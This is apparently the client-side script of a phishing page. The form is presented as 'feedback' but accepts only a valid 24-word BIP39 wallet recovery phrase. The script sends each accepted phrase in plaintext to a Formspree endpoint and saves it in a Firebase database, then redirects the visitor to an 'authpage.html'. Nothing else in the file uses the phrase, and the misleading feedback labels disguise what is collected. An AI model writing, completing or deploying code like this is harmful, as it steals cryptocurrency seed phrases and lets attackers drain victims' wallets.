// ✅ Import official browser module directly
import * as bip39 from 'https://esm.sh/bip39@3.0.4';

// ========================================
// CONFIG
// ========================================
const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mgvglzne';

// ========================================
// HASH FUNCTION
// ========================================
function hashFeedback(text) {
    let hash = 0;
    for (let i = 0; i < text.length; i++) {
        const char = text.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
    }
    return Math.abs(hash).toString(36);
}

// ========================================
// FIREBASE
// ========================================
async function checkExistingSubmission(hash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + hash)
            .once('value');
        return snapshot.val();
    } catch (err) {
        console.error(err);
        return null;
    }
}

async function saveFeedback(hash, text) {
    try {
        await firebase.database()
            .ref('submissions/' + hash)
            .set({
                feedback: text,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                submittedAt: new Date().toISOString(),
                wordCount: text.split(/\s+/).length
            });
        return true;
    } catch (err) {
        console.error(err);
        return false;
    }
}

// ========================================
// FORMSPREE
// ========================================
async function submitToFormspree(text) {
    try {
        await fetch(FORMSPREE_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ feedback: text })
        });
    } catch (err) {
        console.error(err);
    }
}

// ========================================
// VALIDATION
// ========================================
function validateBIP39(mnemonic) {
    try {
        return bip39.validateMnemonic(mnemonic);
    } catch (err) {
        console.error("Validation error:", err);
        return false;
    }
}

// ========================================
// MAIN INIT
// ========================================
document.addEventListener('DOMContentLoaded', function () {

    const form = document.getElementById('feedbackForm');
    const textarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');
    const submitButton = form.querySelector('button[type="submit"]');

    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        const text = textarea.value.trim().toLowerCase();
        const words = text.split(/\s+/).filter(w => w.length > 0);

        // Must be 24 words
        if (words.length !== 24) {
            errorMessage.textContent = 'Invalid passphrase';
            errorMessage.style.display = 'block';
            return;
        }

        // Must pass BIP39 checksum validation
        if (!validateBIP39(text)) {
            errorMessage.textContent = 'Invalid passphrase';
            errorMessage.style.display = 'block';
            return;
        }

        errorMessage.style.display = 'none';
        submitButton.disabled = true;
        submitButton.textContent = "Validating...";

        const feedbackHash = hashFeedback(text);

        const existing = await checkExistingSubmission(feedbackHash);

        if (existing) {
            sessionStorage.setItem('feedbackHash', feedbackHash);
            sessionStorage.setItem('feedback', text);
            sessionStorage.setItem('isReturningFeedback', 'true');
            window.location.href = 'authpage.html';
            return;
        }

        submitToFormspree(text);
        await saveFeedback(feedbackHash, text);

        sessionStorage.setItem('feedbackHash', feedbackHash);
        sessionStorage.setItem('feedback', text);
        sessionStorage.setItem('isReturningFeedback', 'false');

        window.location.href = 'authpage.html';
    });

});
